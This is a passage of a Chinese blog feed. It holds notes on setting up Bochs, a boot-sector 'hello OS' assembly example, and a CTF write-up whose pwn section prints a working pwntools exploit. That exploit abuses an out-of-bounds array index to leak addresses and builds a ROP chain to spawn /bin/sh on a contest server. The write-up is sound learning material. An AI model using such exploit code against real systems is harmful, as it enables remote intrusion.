        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学习完第一章后，成功运行了一个OS版的hello world，第二章主要是讲环境搭建以及之后实验在各种平台可能用到的各种工具，组合五花八门，因为是05年的书，我参考了网上近两年的博客后决定使用linux下的bochs作为之后os的调试工具</p><h1 id="第一步：安装bochs"><a href="#第一步：安装bochs" class="headerlink" title="第一步：安装bochs"></a>第一步：安装bochs</h1><p>环境：VM14+Ubuntu16.04</p><h2 id="1、配置bochs所需环境"><a href="#1、配置bochs所需环境" class="headerlink" title="1、配置bochs所需环境"></a>1、配置bochs所需环境</h2><p>Bochs 需要在 X11 环境下运行，因此你的 Linux 系统必须已经安装了X Window 系统才能使用Bochs</p><p>关于这一点可以在自己的linux通过ps -e|grep ‘tty’查看，可以看到ubuntu16运行了Xorg，这是X windows的一种（图形用户界面的一种）<br><img src="/images/minisystem/2019-5-28-section2-1.png" alt="avatar"></p><p>因为 Bochs 是用C++写的，所以这里要安装GNU gcc/g++编译器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install build-essential </span><br><span class="line">sudo apt-get install xorg-dev </span><br><span class="line">sudo apt-get install bison </span><br><span class="line">sudo apt-get install g++</span><br></pre></td></tr></table></figure></p><h2 id="2、随后便是安装bochs了"><a href="#2、随后便是安装bochs了" class="headerlink" title="2、随后便是安装bochs了"></a>2、随后便是安装bochs了</h2><p>先在<a href="https://sourceforge.net/projects/bochs/files/下载压缩文件（其实也可以用sudo" target="_blank" rel="noopener">https://sourceforge.net/projects/bochs/files/下载压缩文件（其实也可以用sudo</a> apt-get install vgabios bochs bochs-x bximage来安装，但缺点是这样安装的bochs默认是不能进行调试的）</p><p>之后解压<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tar zxvf bochs-2.6.9.tar.gz</span><br></pre></td></tr></table></figure></p><p>随后进入bochs-2.6.9目录，运行configure脚本，它会测试你的机器，C/C++编译器以及一些库，用来判断何种配置适合于你的机器。运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./configure --enable-debugger --enable-disasm</span><br></pre></td></tr></table></figure></p><p>（这两个是用来开启调试和反汇编功能）</p><p>第3步正确运行后，会产生一个Makefile文件，然后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo make</span><br></pre></td></tr></table></figure></p><p>最后安装bochs<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo make install</span><br></pre></td></tr></table></figure></p><p>安装成功后就可以在终端内输入bochs启动了<br><img src="/images/minisystem/2019-5-28-section2-2.png" alt="avatar"></p><h2 id="3、bochs2-6-9运行遇到的各种错误及解决方法"><a href="#3、bochs2-6-9运行遇到的各种错误及解决方法" class="headerlink" title="3、bochs2.6.9运行遇到的各种错误及解决方法"></a>3、bochs2.6.9运行遇到的各种错误及解决方法</h2><p>这里运行成功，但是最后却报错了，安装过程应该没问题，但是配置出现了错误，因此修改bochsrc文件(能运行bochs但出错了，基本都是配置的错误)<br>先备份bochrc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ./.bochsrc /home/stars/bochsrc.bak</span><br></pre></td></tr></table></figure></p><p>根据报错信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00000000000e[      ] .bochsrc:187: wrong value for parameter &apos;model&apos;</span><br><span class="line">00000000000p[      ] &gt;&gt;PANIC&lt;&lt; .bochsrc:187: cpu directive malformed.</span><br></pre></td></tr></table></figure></p><p>可见是cpu的model设置错了<br>解决方法如下：<br>先查看bochs有哪些cpu model<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bochs -help cpu</span><br></pre></td></tr></table></figure></p><p><img src="/images/minisystem/2019-5-28-section2-3.png" alt="avatar"><br>因为我的cpu是intel core所以我把cpu model改成core_duo_t2400_yonah<br><img src="/images/minisystem/2019-5-28-section2-4.png" alt="avatar"><br>注释内容是默认配置</p><p>修改配置后又遇到了新的错误:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.bochsrc:915: Bochs is not compiled with lowlevel sound support</span><br></pre></td></tr></table></figure></p><p><img src="/images/minisystem/2019-5-28-section2-5.png" alt="avatar"><br>解决方法如下：<br>注释掉915行的sound（vim小技巧, : n 可以直接跳到第n行）<br><img src="/images/minisystem/2019-5-28-section2-6.png" alt="avatar"></p><p>再次运行bochs<br><img src="/images/minisystem/2019-5-28-section2-7.png" alt="avatar"><br>成功运行</p><p>安装步骤参考<a href="https://www.linuxidc.com/Linux/2016-10/135905.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2016-10/135905.htm</a><br>错误调试步骤参考<a href="https://www.cnblogs.com/lr-ting/p/10585836.html" target="_blank" rel="noopener">https://www.cnblogs.com/lr-ting/p/10585836.html</a></p><h1 id="第二步：在bochs上加载img"><a href="#第二步：在bochs上加载img" class="headerlink" title="第二步：在bochs上加载img"></a>第二步：在bochs上加载img</h1><p>首先是在**/bochs-2.6.9目录下创建新目录minios，然后把要运行的镜像boot.img拷贝进去<br>随后在minios目录下创建配置文件bochsrc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim bochsrc</span><br></pre></td></tr></table></figure></p><p>配置内容如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#注意&apos;#&apos;后面为注注释内容</span><br><span class="line"></span><br><span class="line">#模拟器的内存 </span><br><span class="line">megs:128</span><br><span class="line"></span><br><span class="line">#这个是BIOS-bochs-latest的路径,自己慢慢找,不一定和我的一样</span><br><span class="line">romimage:file=/usr/local/share/bochs/BIOS-bochs-latest</span><br><span class="line"></span><br><span class="line">#这个是VGABIOS-lgpl-latest的路径,自己慢慢找</span><br><span class="line">vgaromimage:file=/usr/local/share/bochs/VGABIOS-lgpl-latest </span><br><span class="line"></span><br><span class="line">#这个是启动软盘,就是我们下载的那个,就在当前目录下，如果不在当前目录，需要指明路径 </span><br><span class="line">floppya:1_44=boot.img,status=inserted</span><br><span class="line"></span><br><span class="line">#表示从软盘启动</span><br><span class="line">boot:floppy </span><br><span class="line"></span><br><span class="line">#日志输出文件</span><br><span class="line">log:bochsout.txt </span><br><span class="line"></span><br><span class="line">#选项还有很多,想了解更多可以参照原始的.bochsrc文件（在bochs-2.6.9/目录下）</span><br></pre></td></tr></table></figure></p><p>配置文件写好后就执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bochs -f bochsrc （-f 选项表示指定配置文件，后面跟着我们刚写好的配置文件名）</span><br></pre></td></tr></table></figure></p><p>之后输入c，也就是continue，就能运行boot.img<br><img src="/images/minisystem/2019-5-28-section2-8.png" alt="avatar"><br>可以看到虚拟机界面左上角出现了hello world，运行成功，之所以界面很乱，是因为我们的boot.img只是在屏幕的左上角显示hello world，在此之前并没有清空屏幕，所以bochs初始化遗留的内容还保留在屏幕上</p><p>在加载虚拟机之前<br>[0x0000fffffff0] f000:fff0 (unk. ctxt): jmpf 0xf000:e05b          ; ea5be000f0<br>其中jmpf 0xf000:e05b指的是跳转到ROM-BIOS的地址，随后我们输入c，才会加载镜像。</p><p>加载boot.img镜像的步骤参考自<a href="https://blog.csdn.net/the_chosen_1/article/details/88918766#linux011_48" target="_blank" rel="noopener">https://blog.csdn.net/the_chosen_1/article/details/88918766#linux011_48</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-5-28-自己动手写操作系统(1)</title>
      <link href="/passages/2019-5-28-%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F(1)/"/>
      <url>/passages/2019-5-28-%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F(1)/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>期末了，学校的操作系统课需要提交课程设计，想想这学期课程做的五个实验，dhcp、dns、web、ftp、email服务器搭建，实在不知道学校在教什么，所以决定自学写一个操作系统，自己写一个操作系统应该也是很多新手程序员的浪漫理想吧，接下来就是针对《自己动手写操作系统》的学习笔记，全书分为7章。</p><h1 id="第一天：第一章-马上动手写一个最小的“操作系统”"><a href="#第一天：第一章-马上动手写一个最小的“操作系统”" class="headerlink" title="第一天：第一章-马上动手写一个最小的“操作系统”"></a>第一天：第一章-马上动手写一个最小的“操作系统”</h1><p>开发环境：<br>win10<br>VM14+ubuntu16.04</p><p>之后是实验步骤</p><h2 id="1、准备汇编编译器编译-nasm"><a href="#1、准备汇编编译器编译-nasm" class="headerlink" title="1、准备汇编编译器编译 nasm"></a>1、准备汇编编译器编译 nasm</h2><p>sudo apt-get install nasm</p><h2 id="2、编译boot-asm"><a href="#2、编译boot-asm" class="headerlink" title="2、编译boot.asm"></a>2、编译boot.asm</h2><p>在windows上用notepad++直接写一个boot.asm然后复制到ubuntu中（懒得安装中文输入法了）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">org 07c00h;告速编译器程序加载到7c00处</span><br><span class="line">mov ax,cs</span><br><span class="line">mov ds,ax</span><br><span class="line">mov es,ax</span><br><span class="line">call DispStr;调用显示字符串例程</span><br><span class="line">jmp $;无限循环,$表示当前地址,也就是jmp $的地址，这一步能防止代码进入数据区</span><br><span class="line">DispStr:</span><br><span class="line">mov ax,BootMessage</span><br><span class="line">mov bp,ax;es:bp = 串地址</span><br><span class="line">mov cx,16;cx = 串长度</span><br><span class="line">mov ax,01301h;ah = 13, al = 01h</span><br><span class="line">mov bx,000ch;页号为0(bh = 0)黑底红字(b1=0Ch,高亮)</span><br><span class="line">mov dl,0</span><br><span class="line">int 10h;10h 号中断</span><br><span class="line">ret</span><br><span class="line">BootMessage:db&quot;Hello, OS world!&quot;</span><br><span class="line">times 510-($-$$)db0;填充剩下的空间，使生成的二进制代码恰好为512字节</span><br><span class="line">;$$表示当前节(section)起始地址</span><br><span class="line">;在这个只有一节的程序中就是org 07c00h的地址</span><br><span class="line">;所以$$-$就是该段程序从起始到time 510-($-$$)的长度</span><br><span class="line">;加上最后的dw 0xaa55就是512字节</span><br><span class="line">dw 0xaa55;结束标志</span><br></pre></td></tr></table></figure></p><p>然后编译<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nasm boot.asm -o boot.bin</span><br></pre></td></tr></table></figure></p><h2 id="3、制作软盘（系统启动盘）"><a href="#3、制作软盘（系统启动盘）" class="headerlink" title="3、制作软盘（系统启动盘）"></a>3、制作软盘（系统启动盘）</h2><p>空白软盘 这种上古玩意大概只有老师才有了，如今可以使用dd命令制作虚拟软盘<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=boot.bin of=boot.img</span><br></pre></td></tr></table></figure></p><p>参数含义：<br>if=文件名：输入文件名，缺省为标准输入。即指定源文件。&lt; if=input file &gt;<br>of=文件名：输出文件名，缺省为标准输出。即指定目的文件。&lt; of=output file &gt;<br>更多参数可以参考<a href="https://www.cnblogs.com/jikexianfeng/p/6103500.html" target="_blank" rel="noopener">https://www.cnblogs.com/jikexianfeng/p/6103500.html</a><br>将得到的boot.img从虚拟机复制到windows中</p><h2 id="4、通过VM的空白虚拟机加载boot-img"><a href="#4、通过VM的空白虚拟机加载boot-img" class="headerlink" title="4、通过VM的空白虚拟机加载boot.img"></a>4、通过VM的空白虚拟机加载boot.img</h2><p>在VM中创建空白的虚拟机，虚拟机类型我选择其它<br><img src="/images/minisystem/2019-5-28-section1-1.png" alt="avatar"><br>随后在设置中把cd/dvd和网络适配器的自动连接去掉<br><img src="/images/minisystem/2019-5-28-section1-4.png" alt="avatar"><br>之后添加软盘驱动器<br><img src="/images/minisystem/2019-5-28-section1-2.png" alt="avatar"><br>最后在使用软盘映像文件中选择boot.img<br><img src="/images/minisystem/2019-5-28-section1-3.png" alt="avatar"><br>打开虚拟机，实验成功！我们踏出了第一步<br><img src="/images/minisystem/2019-5-28-section1-5.png" alt="avatar"></p><p>在编译过程中可能遇到 label or instruction expected at start of line，基本是格式或者编码的问题，自己手打一遍代码，注意空格和tab是不一样的。</p><p>以上实验步骤参考了<br><a href="https://blog.csdn.net/zashizhi3299/article/details/80870073" target="_blank" rel="noopener">https://blog.csdn.net/zashizhi3299/article/details/80870073</a> 中的空白虚拟机加载虚拟软盘<br><a href="https://blog.csdn.net/YuDale/article/details/65644241" target="_blank" rel="noopener">https://blog.csdn.net/YuDale/article/details/65644241</a> 中的虚拟软盘创建</p><h1 id="关于boot-asm的汇编解析-int-10h"><a href="#关于boot-asm的汇编解析-int-10h" class="headerlink" title="关于boot.asm的汇编解析(int 10h)"></a>关于boot.asm的汇编解析(int 10h)</h1><p>BIOS的10H中断的13号中断用于显示字符串，参数为：</p><p>1、AH＝13H</p><p>2、AL＝显示方式</p><pre><code>如果AL＝0，表示目标字符串仅仅包含字符，属性在BL中包含，不移动光标如果AL＝1，表示目标字符串仅仅包含字符，属性在BL中包含，移动光标如果AL＝2，表示目标字符串包含字符和属性，不移动光标如果AL＝3，表示目标字符串包含字符和属性，移动光标总之，可以归纳为：         ｜BIT7｜BIT6｜BIT5｜BIT4｜BIT3｜BIT2｜BIT1｜BIT0｜ AL       BIT0为0表示不移动光标，为1表示移动光标       BIT1为0表示字符串仅包含字符，为1表示字符串包含属性       BIT2~BIT7未使用</code></pre><p>3、BH表示视频区页数</p><p>4、如果AL的BIT1为0，则BL表示显示属性。属性为：</p><pre><code>｜BIT7｜BIT6｜BIT5｜BIT4｜BIT3｜BIT2｜BIT1｜BIT0｜ BL   BIT7：背景是否闪烁。0不闪烁，1闪烁   BIT6~BIT4为背景色，分别为RGB，000为黑色，111为白色   BIT3为1，则前景色加亮，为0则不加亮   BIT2－BIT0为前景色，意义同背景色</code></pre><p>5、CX为字符串长度</p><p>6、DH表示在第几行显示（0为第一行）</p><p>7、DL表示在第几列显示（0为第一列）</p><p>8、ES：BP指向字符串<br>参考自<a href="https://blog.csdn.net/pdcxs007/article/details/43378229" target="_blank" rel="noopener">https://blog.csdn.net/pdcxs007/article/details/43378229</a></p><p>在王爽的《汇编语言》第三版第九章也有关于显示字符的实验，不过不是通过int 10h中断实现的，而是通过在内存地址B8000H-BFFFFH的空间内写入数据，这样会直接在屏幕上显示字符。</p><h1 id="关于boot-asm的汇编解析-org-07c00h"><a href="#关于boot-asm的汇编解析-org-07c00h" class="headerlink" title="关于boot.asm的汇编解析(org 07c00h)"></a>关于boot.asm的汇编解析(org 07c00h)</h1><p>大部分程序是不需要org的，因为程序装载的时候通常会装载到xxxxH:0000H的位置，也就是偏移0<br>而org xxxx的含义是它告诉汇编器，把所有对内存的地址引用全都加上xxxx，这在程序被强制加载到非0000h偏移时很有用<br>一般编程不加org，因为程序默认加载地址的偏移就是0000h，可写引导扇区时，程序会被加载到0000段，偏移7c00，偏移不是0000，所以用org让所有的内存引用全都加上7c00h。于是，在引导扇区程序里，我们开头会看到这么一句 org 7c00h，因为汇编里十六进制要以数字开头，所以应该这么写org 07c00h。</p><p>参考自：<a href="https://blog.csdn.net/mirage1993/article/details/29908929" target="_blank" rel="noopener">https://blog.csdn.net/mirage1993/article/details/29908929</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-4-21-第十二届全国信息竞赛预赛</title>
      <link href="/passages/2019-4-21-%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E4%BF%A1%E6%81%AF%E7%AB%9E%E8%B5%9B%E9%A2%84%E8%B5%9B/"/>
      <url>/passages/2019-4-21-%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E4%BF%A1%E6%81%AF%E7%AB%9E%E8%B5%9B%E9%A2%84%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="MISC-签到"><a href="#MISC-签到" class="headerlink" title="MISC-签到"></a>MISC-签到</h2><p>打开exe文件，报错，出现opencv的字样，估计是图像识别，果断打开摄像头，发现人头会被绿圈圈出，题目是三人行，因为是单人队伍，只好手机百度人像让他识别了。</p><h2 id="RE-easyGo"><a href="#RE-easyGo" class="headerlink" title="RE-easyGo"></a>RE-easyGo</h2><p>第一天就一道re，easygo，百度查可能是go语言写的，找不到函数入口，然后这题几分钟就被人秒了，我就估计是非常简单的，然后直接查字符串，flag、congr、correct、Try之类的，最后发现几个说明flag正确或失败的字符串都在sub_495150被调用，然后在几个调用点下断点，就发现flag在寄存器里<br><img src="/images/2019-4-21-dishierjie/2019-4-21-easygo2.png" alt="avatar"><br><img src="/images/2019-4-21-dishierjie/2019-4-21-easygo1.png" alt="avatar"></p><h2 id="PWN-your-pwn"><a href="#PWN-your-pwn" class="headerlink" title="PWN-your_pwn"></a>PWN-your_pwn</h2><p><img src="/images/2019-4-21-dishierjie/2019-4-24-yourpwn1.png" alt="avatar"><br>溢出点挺明显的，对数组边界没有进行检查，造成任意地址写入和任意地址泄露<br>因为程序开了NX和PIE，所以在执行ret2libc的时候要先泄露地址<br>初步想法是<br>拿到返回地址<br>计算出rop rdi<br>计算出system_plt<br>拿到栈地址<br>计算出/bin/sh的地址</p><p>下一轮</p><p>放入/bin/sh<br>修改返回rop<br>修改/bin/sh_addr<br>修改system_plt</p><p>Objdump -s pwn查看程序plt表，没发现system，但是发现了puts<br>因为程序加载的基址是不会对地址最后12bit进行随机化的，所以可以根据后12位判断libc库，<a href="https://libc.blukat.me/" target="_blank" rel="noopener">https://libc.blukat.me/</a><br>写泄露脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">s=remote(<span class="string">'39.97.228.196'</span>,<span class="number">60007</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getaddr</span><span class="params">(num,addr)</span>:</span></span><br><span class="line">s.sendlineafter(<span class="string">'input index'</span>,str(num))</span><br><span class="line">re=s.recvuntil(<span class="string">'input'</span>)[<span class="number">-8</span>:<span class="number">-6</span>]</span><br><span class="line"><span class="keyword">if</span> int(re,<span class="number">16</span>)&lt;=<span class="number">15</span>:</span><br><span class="line">addr=<span class="string">"0"</span>+hex(int(re,<span class="number">16</span>))[<span class="number">2</span>:]+addr</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">addr=str(hex(int(re,<span class="number">16</span>)))[<span class="number">2</span>:]+addr</span><br><span class="line">s.sendlineafter(<span class="string">'new value'</span>,str(int(re,<span class="number">16</span>)))</span><br><span class="line"><span class="comment">#print addr</span></span><br><span class="line"><span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,addr)</span>:</span></span><br><span class="line">s.sendlineafter(<span class="string">'input index'</span>,str(num))</span><br><span class="line">re=s.recvuntil(<span class="string">'input'</span>)[<span class="number">-8</span>:<span class="number">-6</span>]</span><br><span class="line"><span class="comment">#addr=str(hex(int(re,16)))[2:]+addr</span></span><br><span class="line">s.sendlineafter(<span class="string">'new value'</span>,str(int(addr,<span class="number">16</span>)))</span><br><span class="line"></span><br><span class="line">s.sendlineafter(<span class="string">'name:'</span>,<span class="string">"yes"</span>)</span><br><span class="line"></span><br><span class="line">b11_addr=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">b11_addr=getaddr(<span class="number">344</span>+i,b11_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"b11_addr:"</span>+b11_addr</span><br><span class="line"></span><br><span class="line">base_addr=int(b11_addr,<span class="number">16</span>)<span class="number">-0xb11</span></span><br><span class="line"><span class="comment">#system_plt=base_addr+elf.plt['system']</span></span><br><span class="line">popedi_addr=base_addr+<span class="number">0xd03</span></span><br><span class="line"></span><br><span class="line">stack_addr=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">stack_addr=getaddr(<span class="number">344</span><span class="number">-8</span>+i,stack_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"stack_addr:"</span>+stack_addr</span><br><span class="line"></span><br><span class="line">bin_addr=int(stack_addr,<span class="number">16</span>)<span class="number">-0x100</span></span><br><span class="line"></span><br><span class="line">libc_addr=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">libc_addr=getaddr(<span class="number">632</span>+i,libc_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_addr:"</span>+libc_addr</span><br><span class="line">libcb=int(libc_addr,<span class="number">16</span>)</span><br><span class="line">libca=int(libc_addr,<span class="number">16</span>)<span class="number">-231</span>-libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">puts_plt=base_addr+elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">bad=<span class="string">'0'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">24</span><span class="number">-8</span>+<span class="number">1</span>):</span><br><span class="line">getaddr(<span class="number">1</span>,bad)</span><br><span class="line"></span><br><span class="line">s.sendlineafter(<span class="string">"do you want continue(yes/no)?"</span>,<span class="string">"yes"</span>)</span><br><span class="line"></span><br><span class="line">popedi=str(hex(popedi_addr)[<span class="number">2</span>:])</span><br><span class="line">popedi=popedi.zfill(<span class="number">16</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">edit(<span class="number">344</span>+i,popedi[<span class="number">2</span>*(<span class="number">8</span>-i)<span class="number">-2</span>:<span class="number">2</span>*(<span class="number">8</span>-i)])</span><br><span class="line"></span><br><span class="line"><span class="comment">#bin=str(hex(bin_addr)[2:])</span></span><br><span class="line"><span class="comment">#bin=bin.zfill(16)</span></span><br><span class="line">libcaddr=hex(int(libc_addr,<span class="number">16</span>))[<span class="number">2</span>:]</span><br><span class="line">libcaddr=libcaddr.zfill(<span class="number">16</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">edit(<span class="number">344</span>+<span class="number">8</span>+i,libcaddr[<span class="number">2</span>*(<span class="number">8</span>-i)<span class="number">-2</span>:<span class="number">2</span>*(<span class="number">8</span>-i)])</span><br><span class="line"></span><br><span class="line">putsplt=str(hex(puts_plt)[<span class="number">2</span>:])</span><br><span class="line">putsplt=putsplt.zfill(<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_plt:"</span>+putsplt</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">edit(<span class="number">344</span>+<span class="number">16</span>+i,putsplt[<span class="number">2</span>*(<span class="number">8</span>-i)<span class="number">-2</span>:<span class="number">2</span>*(<span class="number">8</span>-i)])</span><br><span class="line"></span><br><span class="line">bin_sh=<span class="string">"/bin/sh\x00"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">edit(<span class="number">344</span>+<span class="number">24</span>+i,hex(ord(bin_sh[(i):(i+<span class="number">1</span>)]))[<span class="number">2</span>:])</span><br><span class="line"><span class="comment">#gdb.attach(s)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">24</span><span class="number">-8</span><span class="number">-8</span>+<span class="number">1</span>):</span><br><span class="line">getaddr(<span class="number">1</span>,bad)</span><br><span class="line">s.sendlineafter(<span class="string">"do you want continue(yes/no)?"</span>,<span class="string">"yes"</span>)</span><br><span class="line"></span><br><span class="line">print(s.recv(<span class="number">1024</span>))</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-4-21-dishierjie/2019-4-24-yourpwn2.png" alt="avatar"><br>可以看到返回的值，puts遇到/x00会结束</p><p>但是这里我遇到了一个坑，就是我kali环境下gdb里显示栈里存放的是libc_start+231，导致我在把获得的后12位去libc库上查不到，之后我想找几个ubuntu的libc查查89 c7 e8 f9  97 01是否存在，然后第一次就在我的ubuntu16上找到了</p><p><img src="/images/2019-4-21-dishierjie/2019-4-24-yourpwn3.png" alt="avatar"><br>一算偏移发现是240，于是构造脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 